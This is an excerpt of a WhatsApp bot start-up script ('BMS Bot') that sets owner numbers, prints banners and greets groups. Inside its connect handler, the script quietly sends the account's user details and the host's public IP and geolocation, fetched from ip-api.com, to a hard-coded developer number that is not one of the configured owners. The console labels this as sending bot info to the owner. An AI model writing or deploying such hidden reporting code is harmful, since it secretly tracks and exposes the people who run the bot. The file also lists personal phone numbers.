...
prefix = '#'
shp = '⬡'
owner = "2348092733026@s.whatsapp.net","254114018035@s.whatsapp.net","919065031526@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Subscribe BMS", "Chrome", "3.0"];
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, Subscribe BMS");
console.log(color(figlet.textSync(`${spc1}            BMS Bot`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('[BMS BOT]'), color('BMS 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`911234567890@s.whatsapp.net`, `*Hi Owner BMS, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer BMS Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./BMS.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("911234567890@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer BMS Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./BMS.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'BMS',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;BMS;;;\nFN:resku\nitem1.TEL;waid=2348092733026:+234809 273 3026\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am BMS Bot, ready to help you here ㋛︎", "conversation");
      }
